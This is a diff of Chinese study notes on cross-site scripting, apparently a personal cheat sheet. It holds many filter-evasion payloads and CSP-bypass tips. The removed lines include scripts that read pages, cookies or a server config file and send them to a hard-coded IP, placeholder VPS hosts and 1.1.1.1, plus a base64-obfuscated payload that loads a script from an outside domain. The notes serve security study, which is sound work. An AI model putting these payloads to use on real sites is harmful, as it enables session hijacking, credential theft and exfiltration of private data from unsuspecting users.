@@ -1,36 +1,10 @@
 # xss
 
-## 新
-
- https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities 
-
-## 推荐网站
-
-https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet 
-
-## 近期学习方向
-
-csp，浏览器的xss protect 
-
-dom-xss jsonp
-
-xss 跨域问题
-
-浏览器同源策略
-
-## ssrf
-
-[利用 Gopher 协议拓展攻击面](https://blog.chaitin.cn/gopher-attack-surfaces/)
 
 
+## DOM XSS 检测
 
-## 不同的xss类型
-
-### 反射型xss
-
-### 储存型xss
-
-### dom xss
+观察输入点和输出点：
 
 客户端产生xss
 
@@ -100,459 +74,104 @@ window.setInterval(...)
 
 window.setTimeout(...)
 
+## 绕过
+
+### 过滤特定标签
+
+1. 利用过滤的不完善来绕过
+2. 利用事件属性绕过，如：`onload,onerror`等等
 
 
 
+### 过滤事件
+
+利用事件过滤的不完全绕过
+
+见eventslist.txt
+
+在[mozilla](https://developer.mozilla.org/en-US/docs/Web/Events)中查找
 
 
 
-## xss cheat sheet
+### 敏感字符的绕过
 
-http://ha.ckers.org/xss.html
+#### 字符串拼接
 
-https://gist.github.com/kurobeats/9a613c9ab68914312cbb415134795b45
+`alert=window['alert']`
 
-## 绕过xss-filter
+#### 通过编码绕过
 
-### html标签属性执行xss
+HTML中允许的编码：十进制`&#97`，十六进制`&#x61`
 
-属性:href,lowsrc,src,bgsound,background,value,action,dynsry
+CSS编码：HTML编码和十六进制`\61`
 
-### 空格回车,tab
+js字符串允许编码：八进制`\141`，十六进制`\x61`，Unicode编码`\u61`
 
-原理:javascript 引擎对语句的解析
+jsfucker
 
-```html
-<img src="javas
-          cript:
-          alert(0)"
-```
+#### 过滤"."
 
-### 对标签属性值的转码
+用with代替.
 
-html中属性值本身支持ascii码格式
+如:`document.alert`=>`with(document)alert`
 
-```html
-<img src="javascript:alert(/xss/)">
-变为
-<img src="javascript&#116&#58alert(/xss/)">
-将&#116变为&#000000116也行
-还可以将&#01,&#02等支付插入到javascript或vbscript头部
-```
+#### 过滤()
 
-### 产生自己的事件
+绑定回调函数，如事件函数
 
-onerror,onerror
 
-### 利用css跨站攻击
 
-```css
-<div style="background-image:url(javascript:alert('xss'))"
-<style>
-body{
-    background-image:url("javascript:alert('xss')")
-}
-</style>
-<div style="width:expression(alert('xsss'));">
-<style>
-@import 'javascript:alert()'
-</style>
-```
+#### 过滤空格
 
-加载css的方式:
+标签属性间可以利用0x09,0x10,0x12,0x13,0x0a绕过
 
-- link标签
-  `<link rel="stylesheet" href="xxxx.css">`
-- @import
-  `<style type='text/css'>@import url(xxxx.css);</style>`
+标签名称和第一个属性可以利用`/`来代替空格
 
-### 扰乱过滤规则
+如`<svg onerror="alert(1)">`=>`<svg/onerror="alert(1)">`
+
+#### 利用svg标签绕过
+
+svg内部标签和语句遵循的规则都是直接继承自xml而不是html，这样svg内部的script标签可以允许存在一部分进制或编码后的字符
+
+如
 
 ```html
-<img/src="mar.png" alt="mars">
-    样式标签中的/**/和\和\0会被浏览器忽略
-    <img src="java/*exp/**/script:alert();*/ression(alert(0))">
-    @\i\0m\00p\0000\0000\00000r\000000t "url"
-   将css中的关键字进行转码处理,如将e转换成\65
-    <p style="xss:\0065xpression(alert(/xss/))">
-        
-   样式表也支持分析和解释\连接的16进制字符串形式
-        <style>BODY{background:\75\72\6c....}</style>
+<svg><script>alert&#x28;&#x31;&#x29;</script></svg>
 ```
 
 
 
-## Ajax
+### 字符集编码绕过
 
-Ajax:"异步的javascript和xml",可以不必重新加载网页,而访问其他内容,对于csrf和ssrf都相当有用
 
-### javascript常用函数
 
-#### array.indexof()
+#### IE自动识别编码
 
-#### string.substring()
+#### iframe跨域字符集继承
 
+#### UTF-7和US-ASCII绕过
 
+### 特殊字符绕过
 
-### XMLHttpRequest对象
+[网站](http://l0.cm/encodings/)
 
-获取XMLHttpRequest对象通用代码
 
-```javascript
-xmlhttp=false;
-function getXMLHttpRequest()
-{
-    if(window.XMLHttpRequest)
-        xmlhttp=new XMLHttpRequest();
-    else
-    {
-    	try
-        {
-            xmlhttp=new ActiveXObject("Msxml2.XMLHTTP")
-        }
-        catch (e)
-        {
-            try
-            {
-                xmlhttp=new ActiveXObject("Microsoft.XMLHTTP"); 
-            }
-            catch (e)
-            {
-                xmlhttp=new false;
-            }
-        }
-    }
-}
-```
 
-#### XMLHttpRequest对象的方法
+## html5新增标签
 
-- [`XMLHttpRequest.abort()`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/abort)
+[HTML5 Security Cheatsheet](http://html5.sec.org)
 
-  如果请求已被发送，则立刻中止请求。
+[HTML5 Security Cheatsheet](https://github.com/cure53/H5SC/)
 
-- [`XMLHttpRequest.getAllResponseHeaders()`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/getAllResponseHeaders)
 
-  以字符串的形式返回所有用 [CRLF](https://developer.mozilla.org/en-US/docs/Glossary/CRLF) 分隔的响应头，如果没有收到响应，则返回 `null`。
 
-- [`XMLHttpRequest.getResponseHeader("header")`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/getResponseHeader)
+## httponly绕过
 
-  返回包含指定响应头的字符串，如果响应尚未收到或响应中不存在该报头，则返回 `null`。
+### CVE-2012-0053
 
-- [`XMLHttpRequest.open("method","url"[,async,username,password])`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/open)
 
-  初始化一个请求。该方法只能在 JavaScript 代码中使用，若要在 native code 中初始化请求，请使用 [`openRequest()`](https://developer.mozilla.org/zh-CN/docs/Mozilla/Tech/XPCOM/Reference/Interface/nsIXMLHttpRequest)。
 
-- [`XMLHttpRequest.overrideMimeType()`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/overrideMimeType)
-
-  重写由服务器返回的 MIME 类型。
-
-- [`XMLHttpRequest.send()`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/send)
-
-  发送请求。如果请求是异步的（默认），那么该方法将在请求发送后立即返回。
-
-- [`XMLHttpRequest.setRequestHeader()`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/setRequestHeader)
-
-  设置 HTTP 请求头的值。您必须在 `open()` 之后、`send()` 之前调用 `setRequestHeader()`方法。
-
-#### XMLHttpRequest对象属性
-
-[`XMLHttpRequest.onreadystatechange`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/onreadystatechange)
-
-当 readyState 属性发生变化时调用的 [`EventHandler`](https://developer.mozilla.org/zh-CN/docs/Web/API/EventHandler)。
-
-[`XMLHttpRequest.readyState`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/readyState) 只读
-
-返回 一个无符号短整型（unsigned short）数字，代表请求的状态码。
-
-[`XMLHttpRequest.response`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/response) 只读
-
-返回一个 [`ArrayBuffer`](https://developer.mozilla.org/zh-CN/docs/Web/API/ArrayBuffer)、[`Blob`](https://developer.mozilla.org/zh-CN/docs/Web/API/Blob)、[`Document`](https://developer.mozilla.org/zh-CN/docs/Web/API/Document)，或 [`DOMString`](https://developer.mozilla.org/zh-CN/docs/Web/API/DOMString)，具体是哪种类型取决于 [`XMLHttpRequest.responseType`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/responseType) 的值。其中包含整个响应体（response body）。
-
-[`XMLHttpRequest.responseText`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/responseText) 只读
-
-返回一个 [`DOMString`](https://developer.mozilla.org/zh-CN/docs/Web/API/DOMString)，该 [`DOMString`](https://developer.mozilla.org/zh-CN/docs/Web/API/DOMString) 包含对请求的响应，如果请求未成功或尚未发送，则返回 `null`。
-
-[`XMLHttpRequest.responseType`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/responseType)
-
-一个用于定义响应类型的枚举值（enumerated value）。
-
-[`XMLHttpRequest.responseURL`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/responseURL) 只读
-
-返回响应的序列化（serialized）URL，如果该 URL 为空，则返回空字符串。
-
-[`XMLHttpRequest.responseXML`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/responseXML) 只读
-
-返回一个 [`Document`](https://developer.mozilla.org/zh-CN/docs/Web/API/Document)，其中包含该请求的响应，如果请求未成功、尚未发送或时不能被解析为 XML 或 HTML，则返回 `null`。
-
-[`XMLHttpRequest.status`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/status) 只读
-
-返回一个无符号短整型（unsigned short）数字，代表请求的响应状态。
-
-[`XMLHttpRequest.statusText`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/statusText) 只读
-
-返回一个 [`DOMString`](https://developer.mozilla.org/zh-CN/docs/Web/API/DOMString)，其中包含 HTTP 服务器返回的响应状态。与 [`XMLHTTPRequest.status`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHTTPRequest/status) 不同的是，它包含完整的响应状态文本（例如，"`200 OK`"）。
-
-#### 利用XMLHttpRequest对象读取网页并发送到远程服务器
-
-```javascript
- <script language="javascript">
-        var xmlhttp;
-        function getXMLHttpRequest()
-        {
-            if(window.XMLHttpRequest)
-                xmlhttp=new XMLHttpRequest();
-            else
-            {
-                try
-                {
-                    xmlhttp=new ActiveXObject("Msxml2.XMLHTTP")
-                }
-                catch (e)
-                {
-                    try
-                    {
-                        xmlhttp=new ActiveXObject("Microsoft.XMLHTTP"); 
-                    }
-                    catch (e)
-                    {
-                        xmlhttp=new false;
-                    }
-                }
-            }
-        }
-        function send_info_to_remote(xmlhttp)
-        {
-            var res=xmlhttp.responseText;
-            getXMLHttpRequest();
-            xmlhttp.open("POST","http://39.108.164.219:60000",true);
-            xmlhttp.onreadystatechange=proccessResponse;
-            xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
-            xmlhttp.send(String(res));
-            }
-        function proccessResponse()
-        {
-            if(xmlhttp.readyState==4)
-            {
-                if(xmlhttp.status==200)
-                {
-                    send_info_to_remote(xmlhttp);
-                }else window.alert("error");
-            }
-        }
-        getXMLHttpRequest();
-        xmlhttp.open("GET","http://127.0.0.1/1.html",true);
-        xmlhttp.onreadystatechange=proccessResponse;
-        xmlhttp.send();
-        </script>
-```
-
-
-
-```javascript
- <script language="javascript">
-        var xmlhttp=new XMLHttpRequest();;
-       
-        function send_info_to_remote(xmlhttp)
-        {
-            var res=xmlhttp.responseText;
-			xmlhttp.open("POST","http://39.108.164.219:60000",true);
-            xmlhttp.onreadystatechange=proccessResponse;
-            xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
-            xmlhttp.send(String(res));
-            }
-        function proccessResponse()
-        {
-            if(xmlhttp.readyState==4)
-            {
-                if(xmlhttp.status==200)
-                {
-                    send_info_to_remote(xmlhttp);
-                }else window.alert("error");
-            }
-        }
-        getXMLHttpRequest();
-        xmlhttp.open("GET","http://127.0.0.1/1.html",true);
-        xmlhttp.onreadystatechange=proccessResponse;
-        xmlhttp.send();
-        </script>
-```
-
-
-
-
-
-
-
-## 运用dom技术
-
-```javascript
-document.getElementById
-document.getElementsByName
-document.getElementsByTagName
-document.getElementsByTagName("h1")[0].getAttribute("id");
-document.getElementsByTagName("h1")[0].setAttribute("value","yourname");
-document.createAttribute//结合appendChild利用
-document.body.appendChild
-```
-
-
-
-## 常用的xss语句
-
-读cookie:document.location='http://ip或域名/?'+document.cookie
-
-读源码:document.location='http://ip或域名/?'+btoa(document.body.innerHTML)
-
-### 访问网页
-
-```javascript
-xmlhttp=new XMLHttpRequest();
-xmlhttp.onreadystatechange=function()
-{
-    if (xmlhttp.readyState==4 && xmlhttp.status==200)
-    {
-        document.location='http://vps_ip:23333/?'+btoa(xmlhttp.responseText);
-    }
-}
-xmlhttp.open("POST","request.php",true);
-xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
-xmlhttp.send("url=file:///var/www/html/config.php");
-```
-
-### 重定向
-
-` document.location='http://vps_ip:23333/?'+btoa(xmlhttp.responseText);`
-
-
-
-## **反射型XSS Poc:**
-
- 
-
-**alert()函数过滤：**
-
-```
-<script>alert('xss')</script> 
-<script>confirm('xss')</script> 
-<script>prompt('xss')</script> 
-```
-
- 
-
-<script>标签过滤：
-
-```
-<a href="onclick=alert('xss')"> click</a>123"><a/href=//www.baidu.com/>XssTest</a>
-<img src=# onerror=alert('xss')></img>
-<iframe onload=alert('xss')>
-```
-
- 
-
-**base64加密**
-
-```
-<iframe src='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>
-```
-
- 
-
-**setTimeout**
-
-```
-<svg/onload=setTimeout('ale'+'rt(1)',0)>
-```
-
- 
-
-**过滤双引号**
-
-```
-<input onfocus=alert(1) autofocus>
-<select onfocus=alert(1) autofocus>
-```
-
- 
-
-**chrome**
-
-```
-<img src ?itworksonchrome?\/onerror = alert(1)>
-```
-
- 
-
-**data形式**
-
-```
-<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg></object>
-<embed src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg></embed>
-<script src=data:%26comma;alert(1)></script>
-```
-
- 
-
-**ontoggle**
-
-```
-<details open ontoggle="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#24050;&#26159;&#40644;&#26127;&#29420;&#33258;&#24833;&#65292;&#19968;&#26525;&#32418;&#26447;&#20986;&#22681;&#26469;&#39;&#41;">
-```
-
- 
-
-**frame**
-
-```
-<frame src="javascript:alert(1)">
-<frame src="javascript:%20%0aalert%20%0d %09(1)">
-<iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;" />2134'></textarea><script>alert(/xss/)</script><textarea>
-```
-
- 
-
-**url加密绕圆括号**
-
-```
-<svg/onload=alert(1)>
-<svg onload='JavascRipT:alert%281%29'>
-<svg/onload ="location='jav'+'ascript'+':%2'+'0aler'+'t%20%2'+'81%'+'29'">
-```
-
- 
-
- **XSS漏洞利用方式：**
-
-
-
-```
-<script>window.location="http://www.baidu.com"</script>   重定向钓鱼
-<script>window.location="http://1.1.1.1/cookie.php?cookie="+document.cookie;</script>  接受客户端cookie
-<script>new Image().src="http://1.1.1.1/c.php?output="+document.cookie; </script> http://login.xxx.com/sso/m/mobile-login.do?next_page=http://m.xxx.com&f=coursek12xss",}});setTimeout(atob('ZG9jdW1lbnQuYm9keS5pbm5lckhUTUwgPSAnJztkb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpKS5zcmM9Jy8vZHQzMDEuY29tLzAuanMnOw=='),0);({validate: {//
-```
-
-## 利用php语言特性
-
-### php
-
-$_SERVER['PHP_SELF']
-
-其中PHP_SELF可以换为:SCRIPT_URI,QUERY_STRING,PATH_INFO等
-
-例子:
-
-```php
-<form method="POST" action="<?php echo $_SERVER('PHP_SELF')?>">
-</form>
-```
-
-
-
-exp:
-
-`http://127.0.0.1/1.php/%22%3e%3cscript%3ealert('xss')%3c/script%3e%3cfoo`
-
-
+### Flash/Java
 
 
 
@@ -591,6 +210,24 @@ https://hurricane618.me/2018/06/30/csp-bypass-summary/
 https://cloud.tencent.com/developer/article/1073911
 
 https://paper.seebug.org/423/
+
+
+
+#### CRLF绕过csp
+
+向响应中的csp之前插入换行，导致csp失效
+
+
+
+
+
+#### 利用重定向绕过csp策略为self
+
+如果csp策略为：`default-src 'self';script-src http://example/a/;`
+
+那么如果在`http://example/a/`下找到一个重定向点，就可以绕过csp
+
+
 
 
 
@@ -780,17 +417,31 @@ Content-Security-Policy: default-src 'self'; connect-src *;
 
  我们可以利用留言功能插入一个在表单之外的 input 标签，再利用这两个属性来劫持表单
 
-## xss工具
 
-xss-proxy,xssshell,attackapi,anehta,avws
 
-## xss学习资源
+## 常用工具
 
-https://github.com/Ph0rse/Awesome-XSS 
+### Payload
 
-[https://blog.csdn.net/qq_35513598/article/details/79861908](qq://txfile/#)
+[Burp Payload List](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
 
-## 练习
+https://github.com/Ph0rse/Awesome-XSS
 
-先知xss挑战赛 以及Google'xss挑战有能力的话把这两个搞下。
+[OWASP XSS List](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
+
+[ha.ckers.org](http://ha.ckers.org/xss.html)
+
+[Xss Vector](https://gist.github.com/kurobeats/9a613c9ab68914312cbb415134795b45)
+
+
+
+### 工具
+
+xss平台：[beef](https://github.com/beefproject/beef)
+
+动态执行JS：[JShell](https://github.com/s0md3v/JShell)
+
+xss扫描器：[XSStrike](https://github.com/s0md3v/XSStrike)
+
+xss扫描器：[knoxss](https://knoxss.me/?page_id=7)
 
